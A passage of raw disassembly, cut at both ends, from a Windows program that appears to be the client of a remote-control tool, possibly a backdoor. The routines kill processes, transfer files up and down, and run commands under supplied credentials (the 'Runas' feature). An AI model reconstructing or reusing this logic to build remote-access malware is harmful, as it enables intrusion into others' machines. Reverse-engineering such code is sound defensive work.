                jmp     loc_4056E5
; ---------------------------------------------------------------------------

loc_405653:                             ; CODE XREF: sub_4052B0+397↑j
                push    4
                lea     ecx, [esp+9408h+var_1020]
                push    offset aRsse    ; "rsse"
                push    ecx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_40567C
                lea     ecx, [esp+9404h+var_1010]
                call    sub_407620
                jmp     short loc_4056E5
; ---------------------------------------------------------------------------

loc_40567C:                             ; CODE XREF: sub_4052B0+3BC↑j
                push    2
                lea     edx, [esp+9408h+var_1020]
                push    offset aSl      ; "sl"
                push    edx
                call    sub_40E5DA
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_4056A5
                lea     ecx, [esp+9404h+var_1010]
                call    sub_4065E0
                jmp     short loc_4056E5
; ---------------------------------------------------------------------------

loc_4056A5:                             ; CODE XREF: sub_4052B0+3E5↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    offset aClientDoesNotS ; "\nClient does not support this command!"
                lea     ecx, [esp+9408h+var_93EC]
                call    sub_408560
                lea     eax, [esp+9404h+var_93EC]
                push    eax
                mov     [esp+9408h+var_4], ebx
                call    sub_408F30
                lea     ecx, [esp+9404h+var_93EC]
                call    sub_4085D0
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection

loc_4056E3:                             ; CODE XREF: sub_4052B0+184↑j
                xor     eax, eax

loc_4056E5:                             ; CODE XREF: sub_4052B0+1AA↑j
                                        ; sub_4052B0+1D6↑j ...
                mov     ecx, [esp+9404h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+93F8h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 93F8h
                retn
sub_4052B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_405710      proc near               ; CODE XREF: sub_4052B0+1A5↑p

var_2034        = dword ptr -2034h
var_2030        = dword ptr -2030h
var_202C        = byte ptr -202Ch
var_2028        = dword ptr -2028h
var_2018        = dword ptr -2018h
var_2014        = dword ptr -2014h
var_2010        = byte ptr -2010h
var_200F        = byte ptr -200Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_405710
                mov     eax, large fs:0
                push    eax
                mov     eax, 2028h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+2034h+var_10], eax
                push    ebx
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+203Ch+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                mov     [esp+203Ch+var_2030], ebx
                push    1FFFh
                lea     eax, [esp+2040h+var_200F]
                push    ebx
                mov     [esp+2044h+var_4], ebx
                push    eax
                mov     [esp+2048h+var_2010], bl
                call    sub_413520
                add     esp, 0Ch
                push    offset ProcName ; "NtQuerySystemInformation"
                push    offset ModuleName ; "ntdll.dll"
                call    ds:GetModuleHandleA
                push    eax             ; hModule
                call    ds:GetProcAddress
                lea     ecx, [esp+203Ch+var_2010]
                push    ecx
                lea     edx, [esp+2040h+var_2034]
                push    edx
                mov     [esp+2044h+var_2034], eax
                call    sub_40D8D0
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+203Ch+var_2010]
                mov     [esp+203Ch+var_2014], 0Fh
                mov     [esp+203Ch+var_2018], ebx
                mov     byte ptr [esp+203Ch+var_2028], bl
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_4057C0:                             ; CODE XREF: sub_405710+B5↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_4057C0
                sub     eax, edx
                push    eax
                lea     eax, [esp+2040h+var_2010]
                push    eax
                lea     ecx, [esp+2044h+var_202C]
                call    sub_409840
                lea     ecx, [esp+203Ch+var_202C]
                push    ecx
                mov     byte ptr [esp+2040h+var_4], 1
                call    sub_408F30
                cmp     [esp+203Ch+var_2014], 10h
                jb      short loc_4057FE
                mov     edx, [esp+203Ch+var_2028]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_4057FE:                             ; CODE XREF: sub_405710+DF↑j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                cmp     [esp+203Ch+var_2030], ebx
                jnz     short loc_405818
                push    ebx             ; lpMem
                call    sub_40FD55
                add     esp, 4

loc_405818:                             ; CODE XREF: sub_405710+FD↑j
                mov     eax, 1
                mov     ecx, [esp+203Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     ebx
                mov     ecx, [esp+2034h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 2034h
                retn
sub_405710      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_405850      proc near               ; CODE XREF: sub_4052B0+1D1↑p

var_44          = dword ptr -44h
var_40          = dword ptr -40h
var_3C          = byte ptr -3Ch
var_38          = dword ptr -38h
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = byte ptr -20h
var_1F          = dword ptr -1Fh
var_1B          = dword ptr -1Bh
var_17          = dword ptr -17h
var_13          = word ptr -13h
var_11          = byte ptr -11h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_405850
                mov     eax, large fs:0
                push    eax
                sub     esp, 3Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+48h+var_10], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+54h+var_C]
                mov     large fs:0, eax
                xor     eax, eax
                xor     ebx, ebx
                mov     esi, ecx
                mov     [esp+54h+var_20], bl
                mov     [esp+54h+var_1F], eax
                mov     [esp+54h+var_1B], eax
                mov     [esp+54h+var_17], eax
                mov     [esp+54h+var_13], ax
                mov     [esp+54h+var_11], al
                mov     [esp+54h+var_40], ebx
                push    offset ProcName ; "NtQuerySystemInformation"
                push    offset ModuleName ; "ntdll.dll"
                mov     [esp+5Ch+var_4], ebx
                call    ds:GetModuleHandleA
                push    eax             ; hModule
                call    ds:GetProcAddress
                mov     [esp+54h+var_44], eax
                lea     eax, [esp+54h+var_20]
                push    eax
                mov     edx, offset aJ  ; "J"
                mov     ecx, esi
                call    sub_404E40
                lea     ecx, [esp+58h+var_20]
                add     esp, 4
                push    ecx
                call    sub_40E823
                add     esp, 4
                cmp     eax, ebx
                jnz     short loc_4058F6
                lea     eax, [esp+54h+var_20]
                lea     ecx, [esp+54h+var_44]
                call    sub_40DD30
                jmp     short loc_4058FC
; ---------------------------------------------------------------------------

loc_4058F6:                             ; CODE XREF: sub_405850+95↑j
                push    eax             ; dwProcessId
                call    sub_40DCD0

loc_4058FC:                             ; CODE XREF: sub_405850+A4↑j
                mov     esi, 0Fh
                mov     [esp+54h+var_24], esi
                mov     [esp+54h+var_28], ebx
                mov     byte ptr [esp+54h+var_38], bl
                mov     byte ptr [esp+54h+var_4], 1
                lea     ecx, [esp+54h+var_3C]
                cmp     eax, ebx
                jz      short loc_405923
                push    15h
                push    offset aKillProcessSuc ; "Kill process success!"
                jmp     short loc_40592A
; ---------------------------------------------------------------------------

loc_405923:                             ; CODE XREF: sub_405850+C8↑j
                push    14h
                push    offset aKillProcessFai ; "Kill process failed!"

loc_40592A:                             ; CODE XREF: sub_405850+D1↑j
                call    sub_409840
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     edx, [esp+54h+var_3C]
                push    edx
                call    sub_408F30
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                cmp     [esp+54h+var_24], 10h
                jb      short loc_405963
                mov     eax, [esp+54h+var_38]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_405963:                             ; CODE XREF: sub_405850+104↑j
                mov     [esp+54h+var_24], esi
                mov     [esp+54h+var_28], ebx
                mov     byte ptr [esp+54h+var_38], bl
                cmp     [esp+54h+var_40], ebx
                jnz     short loc_40597E
                push    ebx             ; lpMem
                call    sub_40FD55
                add     esp, 4

loc_40597E:                             ; CODE XREF: sub_405850+123↑j
                mov     eax, 1
                mov     ecx, [esp+54h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                mov     ecx, [esp+48h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 48h
                retn
sub_405850      endp


; =============== S U B R O U T I N E =======================================


sub_4059A0      proc near               ; CODE XREF: sub_4052B0+1FD↑p

var_658         = byte ptr -658h
var_654         = dword ptr -654h
var_644         = dword ptr -644h
var_640         = dword ptr -640h
var_63C         = byte ptr -63Ch
var_638         = dword ptr -638h
var_628         = dword ptr -628h
var_624         = dword ptr -624h
var_620         = byte ptr -620h
var_61F         = dword ptr -61Fh
var_61B         = dword ptr -61Bh
var_617         = dword ptr -617h
var_613         = word ptr -613h
var_611         = byte ptr -611h
var_610         = byte ptr -610h
var_60F         = byte ptr -60Fh
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_405C60
                mov     eax, large fs:0
                push    eax
                sub     esp, 64Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+658h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+66Ch+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    1FFh
                lea     eax, [esp+670h+var_40F]
                push    ebx
                push    eax
                mov     esi, ecx
                mov     [esp+678h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                push    1FFh
                lea     ecx, [esp+670h+var_60F]
                push    ebx
                push    ecx
                mov     [esp+678h+var_610], bl
                call    sub_413520
                xor     eax, eax
                lea     edx, [esp+678h+var_410]
                add     esp, 0Ch
                push    edx
                mov     edx, offset aJ  ; "J"
                mov     ecx, esi
                mov     [esp+670h+var_620], bl
                mov     [esp+670h+var_61F], eax
                mov     [esp+670h+var_61B], eax
                mov     [esp+670h+var_617], eax
                mov     [esp+670h+var_613], ax
                mov     [esp+670h+var_611], al
                call    sub_404E40
                lea     eax, [esp+670h+var_610]
                add     esp, 4
                push    eax
                mov     edx, offset aM  ; "M"
                mov     ecx, esi
                call    sub_404E40
                lea     ecx, [esp+670h+var_620]
                add     esp, 4
                push    ecx
                mov     edx, offset aS_0 ; "S"
                mov     ecx, esi
                call    sub_404E40
                lea     edx, [esp+670h+var_620]
                add     esp, 4
                push    edx
                call    sub_40E823
                add     esp, 4
                mov     edi, eax
                lea     eax, [esp+66Ch+var_610]
                push    offset aR       ; "r"
                push    eax
                call    sub_40ED4E
                mov     esi, eax
                add     esp, 8
                cmp     esi, ebx
                jnz     loc_405B62
                lea     ecx, [esp+66Ch+var_610]
                push    offset aWb      ; "wb"
                push    ecx
                call    sub_40ED4E
                mov     esi, eax
                add     esp, 8
                cmp     esi, ebx
                jnz     loc_405B62
                push    3FFh
                lea     edx, [esp+670h+var_40F]
                push    ebx
                push    edx
                mov     [esp+678h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     eax, [esp+670h+var_410]
                push    offset aPutfileCancele ; "Putfile canceled for : Can not create f"...
                push    eax
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+66Ch+var_410]
                mov     [esp+66Ch+var_624], 0Fh
                mov     [esp+66Ch+var_628], ebx
                mov     byte ptr [esp+66Ch+var_638], bl
                lea     edx, [eax+1]

loc_405B12:                             ; CODE XREF: sub_4059A0+177↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_405B12
                sub     eax, edx
                push    eax
                lea     ecx, [esp+670h+var_410]
                push    ecx
                lea     ecx, [esp+674h+var_63C]
                call    sub_409840
                lea     edx, [esp+66Ch+var_63C]
                push    edx
                mov     [esp+670h+var_4], ebx
                call    sub_408F30
                cmp     [esp+66Ch+var_624], 10h
                jb      short loc_405B52
                mov     eax, [esp+66Ch+var_638]
                push    eax

loc_405B4A:                             ; CODE XREF: sub_4059A0+232↓j
                call    sub_40F15B
                add     esp, 4

loc_405B52:                             ; CODE XREF: sub_4059A0+1A3↑j
                                        ; sub_4059A0+22B↓j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                jmp     loc_405C26
; ---------------------------------------------------------------------------

loc_405B62:                             ; CODE XREF: sub_4059A0+F2↑j
                                        ; sub_4059A0+10E↑j
                push    2
                push    ebx
                push    esi
                call    sub_40F65C
                add     esp, 0Ch
                push    esi
                call    sub_40F564
                add     esp, 4
                push    esi
                mov     ebp, eax
                call    sub_40F867
                add     esp, 4
                cmp     ebp, edi
                jb      short loc_405BD7
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    40h
                push    offset aPutfileCancele_0 ; "Putfile canceled for : Serverfile is no"...
                lea     ecx, [esp+674h+var_658]
                mov     [esp+674h+var_640], 0Fh
                mov     [esp+674h+var_644], ebx
                mov     byte ptr [esp+674h+var_654], bl
                call    sub_409840
                lea     ecx, [esp+66Ch+var_658]
                push    ecx
                mov     [esp+670h+var_4], 1
                call    sub_408F30
                cmp     [esp+66Ch+var_640], 10h
                jb      short loc_405B52
                mov     edx, [esp+66Ch+var_654]
                push    edx
                jmp     loc_405B4A
; ---------------------------------------------------------------------------

loc_405BD7:                             ; CODE XREF: sub_4059A0+1E4↑j
                xor     eax, eax
                lea     esp, [esp+0]

loc_405BE0:                             ; CODE XREF: sub_4059A0+24D↓j
                mov     cl, [esp+eax+66Ch+var_610]
                mov     byte_42B784[eax], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_405BE0
                xor     eax, eax

loc_405BF1:                             ; CODE XREF: sub_4059A0+261↓j
                mov     cl, [esp+eax+66Ch+var_410]
                mov     byte_42B580[eax], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_405BF1
                push    ebx             ; lpThreadId
                push    ebx             ; dwCreationFlags
                push    ebx             ; int
                push    offset sub_402A00 ; int
                push    ebx             ; dwStackSize
                push    ebx             ; lpThreadAttributes
                mov     dword_42B984, ebp
                mov     dword_42B780, edi
                call    sub_40EA6D
                add     esp, 18h
                mov     dword_42C358, eax

loc_405C26:                             ; CODE XREF: sub_4059A0+1BD↑j
                mov     eax, 1
                mov     ecx, [esp+66Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+658h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 658h
                retn
sub_4059A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_405C60      proc near               ; CODE XREF: sub_4052B0+229↑p

var_658         = byte ptr -658h
var_654         = dword ptr -654h
var_644         = dword ptr -644h
var_640         = dword ptr -640h
var_63C         = byte ptr -63Ch
var_638         = dword ptr -638h
var_628         = dword ptr -628h
var_624         = dword ptr -624h
var_620         = byte ptr -620h
var_61F         = dword ptr -61Fh
var_61B         = dword ptr -61Bh
var_617         = dword ptr -617h
var_613         = word ptr -613h
var_611         = byte ptr -611h
var_610         = byte ptr -610h
var_60F         = byte ptr -60Fh
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_405C60
                mov     eax, large fs:0
                push    eax
                sub     esp, 64Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+658h+var_10], eax
                push    ebx
                push    ebp
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+66Ch+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    1FFh
                lea     eax, [esp+670h+var_40F]
                push    ebx
                push    eax
                mov     esi, ecx
                mov     [esp+678h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                push    1FFh
                lea     ecx, [esp+670h+var_60F]
                push    ebx
                push    ecx
                mov     [esp+678h+var_610], bl
                call    sub_413520
                xor     eax, eax
                lea     edx, [esp+678h+var_610]
                add     esp, 0Ch
                push    edx
                mov     edx, offset aJ  ; "J"
                mov     ecx, esi
                mov     [esp+670h+var_620], bl
                mov     [esp+670h+var_61F], eax
                mov     [esp+670h+var_61B], eax
                mov     [esp+670h+var_617], eax
                mov     [esp+670h+var_613], ax
                mov     [esp+670h+var_611], al
                call    sub_404E40
                lea     eax, [esp+670h+var_410]
                add     esp, 4
                push    eax
                mov     edx, offset aM  ; "M"
                mov     ecx, esi
                call    sub_404E40
                lea     ecx, [esp+670h+var_620]
                add     esp, 4
                push    ecx
                mov     edx, offset aS_0 ; "S"
                mov     ecx, esi
                call    sub_404E40
                lea     edx, [esp+670h+var_620]
                add     esp, 4
                push    edx
                call    sub_40E823
                add     esp, 4
                mov     edi, eax
                lea     eax, [esp+66Ch+var_610]
                push    offset aRb      ; "rb"
                push    eax
                call    sub_40ED4E
                mov     esi, eax
                add     esp, 8
                cmp     esi, ebx
                jnz     loc_405E06
                push    3FFh
                lea     ecx, [esp+670h+var_40F]
                push    ebx
                push    ecx
                mov     [esp+678h+var_410], bl
                call    sub_413520
                add     esp, 0Ch
                call    ds:GetLastError
                push    eax
                lea     edx, [esp+670h+var_410]
                push    offset aGetfileCancele ; "\nGetfile canceled for : Can not open f"...
                push    edx
                call    sub_40E37C
                add     esp, 0Ch
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                lea     eax, [esp+66Ch+var_410]
                mov     [esp+66Ch+var_624], 0Fh
                mov     [esp+66Ch+var_628], ebx
                mov     byte ptr [esp+66Ch+var_638], bl
                lea     edx, [eax+1]

loc_405DB6:                             ; CODE XREF: sub_405C60+15B↓j
                mov     cl, [eax]
                inc     eax
                cmp     cl, bl
                jnz     short loc_405DB6
                sub     eax, edx
                push    eax
                lea     eax, [esp+670h+var_410]
                push    eax
                lea     ecx, [esp+674h+var_63C]
                call    sub_409840
                lea     ecx, [esp+66Ch+var_63C]
                push    ecx
                mov     [esp+670h+var_4], ebx
                call    sub_408F30
                cmp     [esp+66Ch+var_624], 10h
                jb      short loc_405DF6
                mov     edx, [esp+66Ch+var_638]
                push    edx

loc_405DEE:                             ; CODE XREF: sub_405C60+216↓j
                call    sub_40F15B
                add     esp, 4

loc_405DF6:                             ; CODE XREF: sub_405C60+187↑j
                                        ; sub_405C60+20F↓j
                push    offset CriticalSection ; lpCriticalSection
                call    ds:LeaveCriticalSection
                jmp     loc_405EC6
; ---------------------------------------------------------------------------

loc_405E06:                             ; CODE XREF: sub_405C60+F2↑j
                push    2
                push    ebx
                push    esi
                call    sub_40F65C
                add     esp, 0Ch
                push    esi
                call    sub_40F564
                add     esp, 4
                push    esi
                mov     ebp, eax
                call    sub_40F867
                add     esp, 4
                cmp     ebp, edi
                ja      short loc_405E7B
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    40h
                push    offset aGetfileCancele_0 ; "Getfile canceled for : Clientfile is no"...
                lea     ecx, [esp+674h+var_658]
                mov     [esp+674h+var_640], 0Fh
                mov     [esp+674h+var_644], ebx
                mov     byte ptr [esp+674h+var_654], bl
                call    sub_409840
                lea     eax, [esp+66Ch+var_658]
                push    eax
                mov     [esp+670h+var_4], 1
                call    sub_408F30
                cmp     [esp+66Ch+var_640], 10h
                jb      short loc_405DF6
                mov     ecx, [esp+66Ch+var_654]
                push    ecx
                jmp     loc_405DEE
; ---------------------------------------------------------------------------

loc_405E7B:                             ; CODE XREF: sub_405C60+1C8↑j
                xor     eax, eax
                lea     ecx, [ecx+0]

loc_405E80:                             ; CODE XREF: sub_405C60+22D↓j
                mov     cl, [esp+eax+66Ch+var_610]
                mov     byte_42BB8C[eax], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_405E80
                xor     eax, eax

loc_405E91:                             ; CODE XREF: sub_405C60+241↓j
                mov     cl, [esp+eax+66Ch+var_410]
                mov     byte_42B988[eax], cl
                inc     eax
                cmp     cl, bl
                jnz     short loc_405E91
                push    ebx             ; lpThreadId
                push    ebx             ; dwCreationFlags
                push    ebx             ; int
                push    offset loc_402F40 ; int
                push    ebx             ; dwStackSize
                push    ebx             ; lpThreadAttributes
                mov     dword_42BD8C, ebp
                mov     dword_42BB88, edi
                call    sub_40EA6D
                add     esp, 18h
                mov     dword_42C35C, eax

loc_405EC6:                             ; CODE XREF: sub_405C60+1A1↑j
                mov     eax, 1
                mov     ecx, [esp+66Ch+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                mov     ecx, [esp+658h+var_10]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 658h
                retn
sub_405C60      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_405F00      proc near               ; CODE XREF: sub_4052B0+255↑p

ProcessInformation= _PROCESS_INFORMATION ptr -10A0h
var_1090        = byte ptr -1090h
var_108C        = dword ptr -108Ch
var_107C        = dword ptr -107Ch
var_1078        = dword ptr -1078h
var_1074        = byte ptr -1074h
var_1070        = dword ptr -1070h
var_1060        = dword ptr -1060h
var_105C        = dword ptr -105Ch
StartupInfo     = _STARTUPINFOW ptr -1058h
var_1010        = byte ptr -1010h
var_100F        = byte ptr -100Fh
MultiByteStr    = byte ptr -0F10h
var_F0F         = byte ptr -0F0Fh
var_E10         = byte ptr -0E10h
var_E0F         = byte ptr -0E0Fh
var_D10         = byte ptr -0D10h
var_D0F         = byte ptr -0D0Fh
CommandLine     = word ptr -0C10h
var_C0E         = byte ptr -0C0Eh
Domain          = word ptr -0A10h
var_A0E         = byte ptr -0A0Eh
WideCharStr     = word ptr -810h
var_80E         = byte ptr -80Eh
Password        = word ptr -610h
var_60E         = byte ptr -60Eh
var_410         = byte ptr -410h
var_40F         = byte ptr -40Fh
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_405F00
                mov     eax, large fs:0
                push    eax
                mov     eax, 1094h
                call    __alloca_probe
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+10A0h+var_10], eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+10ACh+var_C]
                mov     large fs:0, eax
                xor     ebx, ebx
                push    0FFh
                lea     eax, [esp+10B0h+var_F0F]
                push    ebx
                push    eax
                mov     esi, ecx
                mov     [esp+10B8h+MultiByteStr], bl
                call    sub_413520
                add     esp, 0Ch
                push    0FFh
                lea     ecx, [esp+10B0h+var_E0F]
                push    ebx
                push    ecx
                mov     [esp+10B8h+var_E10], bl
                call    sub_413520
                add     esp, 0Ch
                push    0FFh
                lea     edx, [esp+10B0h+var_100F]
                push    ebx
                push    edx
                mov     [esp+10B8h+var_1010], bl
                call    sub_413520
                add     esp, 0Ch
                push    0FFh
                lea     eax, [esp+10B0h+var_D0F]
                push    ebx
                push    eax
                mov     [esp+10B8h+var_D10], bl
                call    sub_413520
                add     esp, 0Ch
                push    1FEh
                lea     edx, [esp+10B0h+var_80E]
                xor     ecx, ecx
                push    ebx
                push    edx
                mov     [esp+10B8h+WideCharStr], cx
                call    sub_413520
                add     esp, 0Ch
                push    1FEh
                lea     ecx, [esp+10B0h+var_60E]
                xor     eax, eax
                push    ebx
                push    ecx
                mov     [esp+10B8h+Password], ax
                call    sub_413520
                add     esp, 0Ch
                push    1FEh
                lea     eax, [esp+10B0h+var_A0E]
                xor     edx, edx
                push    ebx
                push    eax
                mov     [esp+10B8h+Domain], dx
                call    sub_413520
                add     esp, 0Ch
                push    1FEh
                lea     edx, [esp+10B0h+var_C0E]
                xor     ecx, ecx
                push    ebx
                push    edx
                mov     [esp+10B8h+CommandLine], cx
                call    sub_413520
                lea     eax, [esp+10B8h+MultiByteStr]
                add     esp, 0Ch
                push    eax
                mov     edx, offset aJ  ; "J"
                mov     ecx, esi
                call    sub_404E40
                lea     ecx, [esp+10B0h+var_E10]
                add     esp, 4
                push    ecx
                mov     edx, offset aM  ; "M"
                mov     ecx, esi
                call    sub_404E40
                lea     edx, [esp+10B0h+var_1010]
                add     esp, 4
                push    edx
                mov     edx, offset aS_0 ; "S"
                mov     ecx, esi
                call    sub_404E40
                add     esp, 4
                lea     eax, [esp+10ACh+var_D10]
                push    eax
                mov     edx, offset asc_422554 ; "H"
                mov     ecx, esi
                call    sub_404E40
                mov     esi, ds:MultiByteToWideChar
                add     esp, 4
                push    ebx             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     ecx, [esp+10B8h+MultiByteStr]
                push    ecx             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    eax             ; cchWideChar
                lea     edx, [esp+10B0h+WideCharStr]
                push    edx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     eax, [esp+10B8h+MultiByteStr]
                push    eax             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    ebx             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     ecx, [esp+10B8h+var_E10]
                push    ecx             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    eax             ; cchWideChar
                lea     edx, [esp+10B0h+Password]
                push    edx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     eax, [esp+10B8h+var_E10]
                push    eax             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    ebx             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     ecx, [esp+10B8h+var_1010]
                push    ecx             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    eax             ; cchWideChar
                lea     edx, [esp+10B0h+Domain]
                push    edx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     eax, [esp+10B8h+var_1010]
                push    eax             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    ebx             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     ecx, [esp+10B8h+var_D10]
                push    ecx             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                push    eax             ; cchWideChar
                lea     edx, [esp+10B0h+CommandLine]
                push    edx             ; lpWideCharStr
                push    0FFFFFFFFh      ; cbMultiByte
                lea     eax, [esp+10B8h+var_D10]
                push    eax             ; lpMultiByteStr
                push    ebx             ; dwFlags
                push    ebx             ; CodePage
                call    esi ; MultiByteToWideChar
                xor     eax, eax
                push    40h
                mov     [esp+10B0h+ProcessInformation.hProcess], ebx
                mov     [esp+10B0h+ProcessInformation.hThread], eax
                mov     [esp+10B0h+ProcessInformation.dwProcessId], eax
                mov     [esp+10B0h+ProcessInformation.dwThreadId], eax
                push    ebx
                lea     ecx, [esp+10B4h+StartupInfo.lpReserved]
                push    ecx
                call    sub_413520
                add     esp, 0Ch
                lea     edx, [esp+10ACh+ProcessInformation]
                push    edx             ; lpProcessInformation
                lea     eax, [esp+10B0h+StartupInfo]
                push    eax             ; lpStartupInfo
                push    ebx             ; lpCurrentDirectory
                push    ebx             ; lpEnvironment
                push    ebx             ; dwCreationFlags
                lea     ecx, [esp+10C0h+CommandLine]
                push    ecx             ; lpCommandLine
                push    ebx             ; lpApplicationName
                push    ebx             ; dwLogonFlags
                lea     edx, [esp+10CCh+Password]
                push    edx             ; lpPassword
                lea     eax, [esp+10D0h+Domain]
                push    eax             ; lpDomain
                lea     ecx, [esp+10D4h+WideCharStr]
                push    ecx             ; lpUsername
                mov     [esp+10D8h+StartupInfo.cb], 44h
                call    ds:CreateProcessWithLogonW
                test    eax, eax
                jz      short loc_4061FE
                mov     edx, [esp+10ACh+ProcessInformation.hProcess]
                mov     esi, ds:CloseHandle
                push    edx             ; hObject
                call    esi ; CloseHandle
                mov     eax, [esp+10ACh+ProcessInformation.hThread]
                push    eax             ; hObject
                call    esi ; CloseHandle
                push    offset CriticalSection ; lpCriticalSection
                call    ds:EnterCriticalSection
                push    0Fh
                push    offset aRunasSuccess ; "\nRunas Success!"
                lea     ecx, [esp+10B4h+var_1090]
                mov     [esp+10B4h+var_1078], 0Fh
                mov     [esp+10B4h+var_107C], ebx
                mov     byte ptr [esp+10B4h+var_108C], bl
                call    sub_409840
                lea     ecx, [esp+10ACh+var_1090]
                push    ecx
                mov     [esp+10B0h+var_4], ebx
                call    sub_408F30
                cmp     [esp+10ACh+var_1078], 10h
                jb      loc_4062A4
                mov     edx, [esp+10ACh+var_108C]
                push    edx
                jmp     loc_40629C
; ---------------------------------------------------------------------------

loc_4061FE:                             ; CODE XREF: sub_405F00+297↑j
                push    3FFh
                lea     eax, [esp+10B0h+var_40F]
                push    ebx
                push    eax
